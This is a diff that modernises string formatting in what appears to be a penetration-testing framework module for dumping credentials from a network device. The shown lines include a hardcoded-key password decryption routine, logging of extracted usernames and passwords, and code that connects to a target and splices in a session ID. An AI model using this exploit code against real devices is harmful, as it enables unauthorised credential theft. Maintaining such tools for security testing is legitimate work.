@@ -45,9 +45,10 @@ metadata = {
 def decrypt_password(user, pass_enc):
     key = hashlib.md5(user + b"283i4jfkai3389").digest()
 
-    passw = ""
-    for i in range(0, len(pass_enc)):
-        passw += chr(pass_enc[i] ^ key[i % len(key)])
+    passw = "".join(
+        chr(pass_enc[i] ^ key[i % len(key)]) for i in range(len(pass_enc))
+    )
+
     return passw.split("\x00")[0]
 
 def extract_user_pass_from_entry(entry):
@@ -84,12 +85,12 @@ def dump(data):
     user_pass = get_pair(data)
     user_pass = set(user_pass) # unique it to avoid duplicates
     for u, p in user_pass:
-        logging.info('Extracted Username: "{}" and password "{}"'.format(u,p))
+        logging.info(f'Extracted Username: "{u}" and password "{p}"')
 
 # end of direct port
 
 def run(args):
-    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
+    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")
     if dependencies_missing:
         logging.error('Module dependency (requests) is missing, cannot continue')
         return
@@ -126,7 +127,7 @@ def run(args):
     try:
         s.connect((args['rhost'], int(args['rport'])))
     except Exception as e:
-        logging.error("Connection error: {}".format(e))
+        logging.error(f"Connection error: {e}")
         return
 
     #Convert to bytearray for manipulation
@@ -138,11 +139,11 @@ def run(args):
     try:
         d = bytearray(s.recv(1024))
     except Exception as e:
-        logging.error("Connection error: {}".format(e))
+        logging.error(f"Connection error: {e}")
         return
 
     session_id = d[38]
-    logging.info("Session ID: {}".format(session_id))
+    logging.info(f"Session ID: {session_id}")
     #Replace the session id in template
     b[19] = session_id
 
